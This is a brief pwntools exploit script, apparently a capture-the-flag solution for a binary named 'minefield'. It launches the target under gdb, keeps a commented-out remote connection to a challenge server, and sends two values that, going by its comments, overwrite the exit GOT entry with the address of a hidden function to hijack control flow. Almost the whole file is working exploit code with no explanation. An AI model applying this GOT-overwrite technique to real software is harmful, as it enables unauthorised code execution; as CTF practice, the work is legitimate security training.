#!/usr/bin/env python3

from pwn import *

p = process("./minefield")


gdb.attach(p, '''
set backtrace past-main
set backtrace past-entry
break *0x400bb9
break *0x400c29
break _
continue
''')

#p = remote('188.166.172.13',30086)

print(p.recvuntil("> ").decode())


p.sendline('2')
print(p.recvuntil("mine: ").decode())

payload1 = str(0x6012d0)#  + b'\x00\x00\x00\x00\x00' # overwrite exit GOT entry
print(payload1)


p.send(payload1)

print(p.recvuntil("plant: ").decode())

payload2 = str(0x40096b) # point to hidden func
print(payload2)
p.send(payload2)

